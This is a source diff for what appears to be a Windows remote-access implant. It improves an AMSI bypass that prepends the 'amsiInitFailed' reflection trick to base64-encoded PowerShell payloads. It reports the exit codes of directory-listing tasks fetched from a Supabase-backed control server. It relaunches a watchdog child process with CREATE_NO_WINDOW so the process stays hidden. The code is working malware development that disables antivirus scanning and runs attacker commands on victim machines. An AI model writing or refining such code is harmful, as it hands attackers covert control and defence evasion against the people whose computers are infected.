@@ -957,9 +957,13 @@ static void CheckAndHandleExec() {
     // AMSI bypass for PowerShell commands
     if (payload.find("powershell") != std::string::npos || payload.find("pwsh") != std::string::npos) {
         std::string bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";
-        if (payload.find("-Enc") != std::string::npos) {
-            size_t encPos = payload.find("-Enc");
-            size_t argStart = payload.find_first_not_of(" \t", encPos + 4);
+        if (payload.find("-EncodedCommand") != std::string::npos || payload.find("-Enc") != std::string::npos) {
+            size_t encPos = payload.find("-EncodedCommand");
+            if (encPos == std::string::npos) encPos = payload.find("-Enc ");
+            if (encPos == std::string::npos) encPos = payload.find("-Enc\"");
+            if (encPos == std::string::npos) encPos = payload.find("-Enc=");
+            size_t skip = (payload.substr(encPos, 16) == "-EncodedCommand") ? 16 : 4;
+            size_t argStart = payload.find_first_not_of(" \t", encPos + skip);
             if (argStart != std::string::npos) {
                 size_t argEnd = std::string::npos;
                 size_t quoteOffset = 0;
@@ -968,14 +972,13 @@ static void CheckAndHandleExec() {
                 if (argEnd != std::string::npos) {
                     std::string encoded = payload.substr(quoteOffset, argEnd - quoteOffset);
                     std::string decoded = Base64Decode(encoded);
-                    if (!decoded.empty()) {
-                        // PowerShell -Enc uses UTF-16LE base64
-                        std::string wideCmd = bypass + std::string((const char*)decoded.data(), decoded.size());
-                        // Re-encode as UTF-16LE base64
-                        int wideLen = MultiByteToWideChar(CP_UTF8, 0, wideCmd.c_str(), -1, NULL, 0);
-                        std::wstring wideBuf((size_t)wideLen - 1, 0);
-                        MultiByteToWideChar(CP_UTF8, 0, wideCmd.c_str(), -1, &wideBuf[0], wideLen);
-                        std::string reEncoded = Base64Encode((BYTE*)wideBuf.data(), (DWORD)wideBuf.size() * 2);
+                    if (!decoded.empty() && decoded.size() >= 2) {
+                        // Reinterpret as UTF-16LE and prepend bypass
+                        std::wstring originalCmd((wchar_t*)decoded.data(), decoded.size() / 2);
+                        originalCmd.erase(std::find(originalCmd.begin(), originalCmd.end(), L'\0'), originalCmd.end());
+                        std::wstring wbypass = ToWide(bypass);
+                        std::wstring combined = wbypass + originalCmd;
+                        std::string reEncoded = Base64Encode((BYTE*)combined.data(), (DWORD)combined.size() * 2);
                         payload = payload.substr(0, quoteOffset) + reEncoded + payload.substr(argEnd);
                     }
                 }
@@ -2060,9 +2063,10 @@ static void CheckAndHandleDirlist() {
     std::string rowId = ExtractJSONNumber(resp, "id");
     std::string path = ExtractJSONString(resp, "payload");
     if (rowId.empty() || path.empty()) return;
-    std::string output = ExecuteCommand("dir /b \"" + path + "\"");
+    DWORD exitCode = 0;
+    std::string output = ExecuteCommand("dir /b \"" + path + "\"", &exitCode);
     if (output.empty()) output = "(empty or invalid path)";
-    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"dirlist " + EscapeJSON(path) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":0}]";
+    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"dirlist " + EscapeJSON(path) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
     HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
     json = "{\"executed\":true}";
     std::wstring patchPath = SUPABASE_CONTROL_PATH;
@@ -2622,7 +2626,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
         PROCESS_INFORMATION pi = {0};
         std::string childCmd = "\"" + exePath + "\" --child";
 
-        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             Sleep(30000);
             continue;
         }
